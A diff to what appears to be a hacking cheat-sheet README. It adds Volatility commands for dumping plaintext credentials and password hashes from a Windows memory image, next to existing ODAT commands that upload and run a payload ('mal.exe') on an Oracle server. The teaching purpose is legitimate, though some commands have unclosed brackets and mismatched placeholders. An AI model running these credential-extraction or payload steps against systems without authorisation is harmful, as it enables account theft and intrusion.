@@ -20,6 +20,7 @@ Table of Contents
       * [From Exchange Windows Permissions group to Administrators](#from-exchange-windows-permissions-group-to-administrators)
    * [EternalBlue Vulnerabilities exploitation](#eternalblue-vulnerabilities-exploitation)
    * [Oracle Hacking](#oracle-hacking)
+   * [Forensics](#forensics)
    * [WebApplication Hacking](#webapplication-hacking)
       * [Create a PHP Backdoor shell](#create-a-php-backdoor-shell)
       * [Demonstrating the possibility of steal cookies abusing of XSS vulnerability](#demonstrating-the-possibility-of-steal-cookies-abusing-of-xss-vulnerability)
@@ -284,6 +285,20 @@ Trying to upload & execute payload:
 ```bash
 ./odat-libc2.12-x86_64 utlfile -s [IP] -U [USER] -P [PASS] --sysdba --putFile C:/ mal.exe /tmp/mal.exe -d [SID]
 ./odat-libc2.12-x86_64 externaltable -s [IP] -U [USER] -P [PASS] -d [SID] --sysdba --exec C:/ mal.exe
+```
+
+# Forensics
+## Extracting credentials from memory dump
+If we are lucky maybe we found memory dump file, for ethical hacking matters the most valuable information we can retrieve from this type of files are the hashes/plain text passwords, using volatility is just simple as:
+```bash
+# First let's get some information about the system:
+volatility -f [DUMP-FILE] imageinfo
+# Now we can try to dump the credentials in plain text, lsadump plugin will do the job
+volatility -f [DUMP-FILE] --profile=[PROFILE-SUGGESTED] lsadump
+# It's possible that we don't find any, overall in latest Windows SO versions, we can run a third execution:
+volatility -f [DUMP-FILE --profile [PROFILE-SUGGESTED hivelist
+# The result of this last command should be some system paths, we have to look for SYSTEM and SAM files:
+volatility -f [DUMP-FILE] --profile [SUGGESTED-FILE] hashdump -y [SYSTEM-VIRTUAL-ADDRESS] -s [SAM-VIRTUAL-ADDRESS]
 ```
 
 # WebApplication Hacking
